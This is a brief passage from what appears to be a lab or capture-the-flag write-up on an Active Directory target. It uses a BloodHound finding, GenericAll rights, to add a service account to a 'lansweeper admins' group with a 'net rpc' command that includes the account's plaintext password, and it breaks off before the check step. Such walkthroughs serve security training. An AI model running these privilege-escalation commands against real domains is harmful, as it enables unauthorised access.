Bloodhound

This new user has some outbound object control, specifically GenericAll on the lansweeper admins group This means i should be able to add this current user to the lansweeper admins group

Adding svc_inventory_lnx to the lansweeper admins group

pythonnet rpc group addmem "lansweeper admins" "svc_inventory_lnx" -U "sweep.vl"/"svc_inventory_lnx"%'0|5m-U6?/uAX' -S "inventory.sweep.vl"

This should have added the user to the group but i can check with:
